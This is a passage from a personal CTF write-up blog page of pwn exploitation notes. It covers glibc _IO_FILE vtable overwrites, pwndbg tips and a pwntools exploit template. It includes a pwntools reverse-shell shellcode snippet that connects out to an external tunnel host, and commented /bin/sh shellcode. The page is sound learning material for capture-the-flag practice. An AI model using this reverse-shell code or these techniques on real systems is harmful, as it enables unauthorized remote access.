+<p>But what is <code>_IO_list_all</code>? Well, it&rsquo;s a pointer to the first <code>_IO_FILE</code> (head) entry in the <code>_IO_FILE</code> chain. Then, each one points to the next (stderr -&gt; stdout -&gt; stdin -&gt; &hellip;). That&rsquo;s happening through the <code>_chain</code> pointer each structure has.</p>
+<p>The <code>vtable</code> lives inside each <code>_IO_FILE</code> structure, after all the <code>file</code> details. Inside the <code>vtable</code> is a, well, table of all the function used by these structures. Usually it&rsquo;s at offset <code>_IO_FILE + 0xd8</code>.</p>
+<p>Keep in mind, when overwriting the <code>vtable</code>, versions more recent than 2.23 will throw an <code>Fatal error: glibc detected an invalid stdio handle</code> error.</p>
+<h2 id="reverse-shell">reverse shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h2>
+<p>You can read more about it <a href="https://irinasusca.github.io/writeup-blog/revshell">here</a>.</p>
+<p>If you need a reverse shell, through shellcoding, pwntools will take care of you:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;bore.pub&#39;</span>, <span style="color:#ae81ff">33843</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>findpeersh()
+</span></span></code></pre></div><p>That&rsquo;s it!</p>
+<h2 id="testing">testing<a hidden class="anchor" aria-hidden="true" href="#testing">#</a></h2>
+<p>Sometimes you need to test how one of your ideas will work, so you don&rsquo;t waste time trying a wrong hypothesis. You can create your own C file, write what you&rsquo;re trying to achieve, and compile it with <code>gcc file.c</code>.</p>
+<p>Then, look through the binary - you can set breakpoints at important calls and it might clear up what you need to do with your registers.</p>
+<h2 id="pwndbg">pwndbg<a hidden class="anchor" aria-hidden="true" href="#pwndbg">#</a></h2>
+<p>I keep discovering really cool stuff about this - for example, the stack layout:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/stack.png#center"></p>
+<p>It shows you each value at the offset from both <code>rsp</code> (positive) and <code>rbp</code> (negative)!</p>
+<p>You can also view the full stack frame with <code>telescope $rsp 50</code>.</p>
+<p>To set a pie breakpoint just do <code>brva 0xoffset</code>.</p>
+<p>You can quickly view the got by (guess what) writing <code>got</code>.</p>
+<h2 id="boilerplate">boilerplate<a hidden class="anchor" aria-hidden="true" href="#boilerplate">#</a></h2>
+<p>This is the template with useful comments that I use as a starting point for all my pwn challenges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/file&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;34.185.222.215:30484&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read hex leak: </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pie_leak = int(pie_leak, 16)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read hex bytes: </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># val = u64(data.ljust(8, b&#34;\x00&#34;))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#local testing, run normally</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#remote testing, run python3 exploit.py REMOTE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#strings libc.so.6 | grep &#34;GNU C Library&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#strings libc.so.6 | grep &#34;release version&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(&#34;.&#34;.join(f&#34;%{i}$p&#34; for i in range(1, 51)))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shell = b&#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39; shortest shell</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/materials/">Materials</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
